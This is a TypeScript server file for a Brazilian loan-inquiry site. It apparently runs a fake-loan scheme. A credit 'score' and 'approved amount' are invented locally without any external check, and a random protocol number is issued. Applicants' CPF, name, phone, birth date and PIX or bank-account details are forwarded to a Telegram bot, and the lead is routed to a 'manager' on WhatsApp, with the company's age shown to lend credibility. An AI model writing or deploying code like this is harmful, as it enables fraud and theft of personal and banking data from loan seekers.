import { createServerFn } from "@tanstack/react-start";
import { z } from "zod";
import { checkRateLimit } from "./security";
import {
  BANKS, DURATIONS, PIX_TYPES, PROFILES, RANGES, REASONS,
  computeAmount, computeScore, isValidCPF, isValidPhone,
  onlyDigits,
  type Duration, type Range, type Reason,
} from "./loan";

const keys = <T extends object>(o: T) => Object.keys(o) as [string, ...string[]];

// ─────────────────────────────────────────────────────────────
// 1. Avalia score + valor (sem API externa)
// ─────────────────────────────────────────────────────────────
const evalSchema = z.object({
  cpf:      z.string().refine(isValidCPF, "CPF inválido"),
  duration: z.enum(keys(DURATIONS)),
  range:    z.enum(keys(RANGES)),
  reason:   z.enum(keys(REASONS)),
});

export const evaluateInquiry = createServerFn({ method: "POST" })
  .inputValidator((d) => evalSchema.parse(d))
  .handler(async ({ data }) => {
    const cleanCpf = onlyDigits(data.cpf);

    // Rate limit: máx. 10 simulações por CPF a cada 5 min (anti-enumeração)
    const cpfCheck = checkRateLimit(`inquiry:eval:${cleanCpf}`, {
      windowMs:    5 * 60 * 1000,
      maxRequests: 10,
    });
    if (!cpfCheck.allowed) {
      throw new Error("Muitas consultas recentes para este CPF. Aguarde alguns instantes.");
    }

    const score  = computeScore({ cpf: data.cpf, duration: data.duration as Duration, range: data.range as Range, reason: data.reason as Reason });
    const amount = computeAmount(score, data.range as Range);
    return { score, amount };
  });

// ─────────────────────────────────────────────────────────────
// 2. Config pública do bot Telegram (nome do gerente, WhatsApp, etc.)
// ─────────────────────────────────────────────────────────────
export const getPublicConfig = createServerFn({ method: "GET" })
  .handler(async () => {
    const { getConfig } = await import("./bot-config");
    const cfg = getConfig();
    return {
      whatsappNumber:   cfg.whatsappNumber,
      managerName:      cfg.managerName,
      managerAvatarUrl: cfg.managerAvatarUrl,
      companyYears:     cfg.companyYears,
    };
  });

// ─────────────────────────────────────────────────────────────
// 3. Submissão final — salva lead + dispara notificação Telegram
// ─────────────────────────────────────────────────────────────
const submitSchema = z.object({
  leadId:    z.string().optional(),
  cpf:       z.string().refine(isValidCPF,    "CPF inválido"),
  phone:     z.string().refine(isValidPhone,  "Celular inválido"),
  fullName:  z.string().trim().min(2).max(100),
  birthDate: z.string().default("01/01/1970"),
  profile:   z.enum(keys(PROFILES)),
  duration:  z.enum(keys(DURATIONS)),
  range:     z.enum(keys(RANGES)),
  reason:    z.enum(keys(REASONS)),
  otherBanks: z
    .array(z.enum(BANKS as unknown as [string, ...string[]]))
    .max(BANKS.length)
    .default([]),
  // Payout is optional — lead goes straight to WhatsApp
  payout: z
    .discriminatedUnion("method", [
      z.object({ method: z.literal("pix"), pixType: z.enum(PIX_TYPES), pixKey: z.string().max(120) }),
      z.object({
        method:   z.literal("conta"),
        bankName: z.string().trim().min(2).max(60),
        agency:   z.string(),
        account:  z.string(),
      }),
    ])
    .optional(),
});

export const submitInquiry = createServerFn({ method: "POST" })
  .inputValidator((d) => submitSchema.parse(d))
  .handler(async ({ data }) => {
    const cleanCpf = onlyDigits(data.cpf);

    // Rate limit: máx. 3 submissões por CPF a cada 10 min (anti-spam)
    const submitCheck = checkRateLimit(`inquiry:submit:${cleanCpf}`, {
      windowMs:    10 * 60 * 1000,
      maxRequests: 3,
    });
    if (!submitCheck.allowed) {
      throw new Error("Limite de solicitações atingido para este CPF. Tente mais tarde.");
    }

    const score    = computeScore({ cpf: data.cpf, duration: data.duration as Duration, range: data.range as Range, reason: data.reason as Reason });
    const amount   = computeAmount(score, data.range as Range);
    const protocol = "AGI" + Math.random().toString(36).substring(2, 8).toUpperCase();

    const p = data.payout;

    // Notifica o bot do Telegram com os dados completos do lead
    try {
      const { sendTelegramNotification } = await import("./telegram-notifier");
      await sendTelegramNotification({
        leadId:         data.leadId || `LEAD_${cleanCpf.slice(0, 6)}`,
        cpf:            data.cpf,
        name:           data.fullName.trim(),
        phone:          data.phone,
        birthDate:      data.birthDate,
        profile:        data.profile,
        reason:         data.reason,
        duration:       data.duration,
        range:          data.range,
        calculatedScore: score,
        approvedAmount:  amount,
        otherBanks:     data.otherBanks,
        payoutMethod:   p?.method,
        pixType:        p?.method === "pix" ? p.pixType   : undefined,
        pixKey:         p?.method === "pix" ? p.pixKey    : undefined,
        bankName:       p?.method === "conta" ? p.bankName : undefined,
        agency:         p?.method === "conta" ? p.agency   : undefined,
        account:        p?.method === "conta" ? p.account  : undefined,
        step:           "review_accepted",
        stepDetails:    `Protocolo: ${protocol} · Lead direcionado ao WhatsApp do gerente.`,
      });
    } catch (err) {
      // Falha silenciosa — não bloqueia o lead de ir ao WhatsApp
      console.error("[submitInquiry] Telegram notification failed:", err);
    }

    return { protocol, score, amount };
  });
